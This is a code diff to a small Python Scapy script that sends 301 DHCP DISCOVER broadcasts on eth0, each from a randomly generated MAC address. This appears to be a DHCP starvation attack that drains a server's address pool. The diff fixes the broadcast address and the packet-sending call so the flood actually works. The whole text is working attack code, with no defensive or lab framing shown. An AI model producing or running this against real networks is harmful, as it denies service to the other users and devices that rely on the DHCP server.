@@ -7,10 +7,10 @@ for i in range(300 + 1):
     mac_address = sc.RandMAC()
     # create dhcp request packet
     etternet = sc.Ether(src=mac_address, dst="ff:ff:ff:ff:ff:ff")  
-    ip = sc.IP(src="0.0.0.0", dst="255.255.255.0")  
+    ip = sc.IP(src="0.0.0.0", dst="255.255.255.255")  
     udp = sc.UDP(sport=68, dport=67)  
     bootp = sc.BOOTP(op=1, chaddr=mac_address)
     dhcp = sc.DHCP(options=[("message-type", "discover"), ("end")])
     pkt = etternet / ip / udp / bootp / dhcp
-    sendp(pkt,iface='eth0', verbose=0)
+    sc.sendp(pkt, iface="eth0", verbose=0)
 print("script finish.")
